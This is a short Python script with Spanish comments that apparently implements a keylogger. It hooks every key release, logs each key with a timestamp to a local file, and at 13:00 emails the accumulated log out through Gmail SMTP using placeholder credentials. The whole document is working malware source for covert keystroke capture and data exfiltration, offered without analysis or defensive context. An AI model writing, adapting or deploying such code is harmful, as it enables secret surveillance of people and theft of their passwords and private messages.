import keyboard
import datetime
import smtplib

def send_email(message):
    # Configura el servidor SMTP y los detalles del remitente y destinatario
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('tu_correo@gmail.com', 'tu_contraseña')
    server.sendmail('tu_correo@gmail.com', 'destinatario@gmail.com', message)
    server.quit()

def on_key_press(event):
    # Registra la tecla presionada y la hora actual
    key = event.name
    current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log = f'Tecla: {key}, Hora: {current_time}'

    # Guarda el registro en un archivo de texto
    with open('log.txt', 'a') as file:
        file.write(log + '\n')

    # Envia el registro por correo electrónico una vez al día a las 13:00
    if datetime.datetime.now().strftime('%H:%M') == '13:00':
        with open('log.txt', 'r') as file:
            log_content = file.read()
            send_email(log_content)

# Configura el hook del teclado y comienza a capturar las pulsaciones de teclas
keyboard.on_release(on_key_press)

# Ejecuta el programa en bucle
keyboard.wait()